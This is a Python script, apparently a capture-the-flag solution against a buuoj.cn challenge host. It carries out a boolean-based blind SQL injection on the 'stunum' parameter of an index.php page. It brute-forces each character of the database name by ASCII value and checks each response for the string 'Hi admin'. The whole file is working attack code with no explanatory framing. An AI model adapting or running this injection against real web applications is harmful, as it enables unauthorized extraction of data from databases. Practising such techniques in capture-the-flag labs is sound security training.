import requests

url="http://ea48910f-376f-4f65-9b03-20a70766520e.node3.buuoj.cn/index.php"
# url="http://1a80bd91-ddfa-4db6-bd93-198413227815.node3.buuoj.cn/index.php?stunum=if(ascii(substr(database(),1,1))=55,1,2)"
payload="if(ascii(substr(database(),{},1))={},1,2)"

# if(ascii(substr(database(),1,1))=54,1,2)
# if(ascii(substr(select database(),1,1))=55,1,2)
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
if __name__ == "__main__":
    result=""
    for i in range(1,25):
        for ac in range(33,125):
            params={
                "stunum":payload.format(i,ac)
            }
            response=requests.get(url=url,params=params)
            # response=requests.get(url=url)
            # print(response.text)
            if("Hi admin" in response.text):
                result+=chr(ac)
            # print(ac)
        print(result)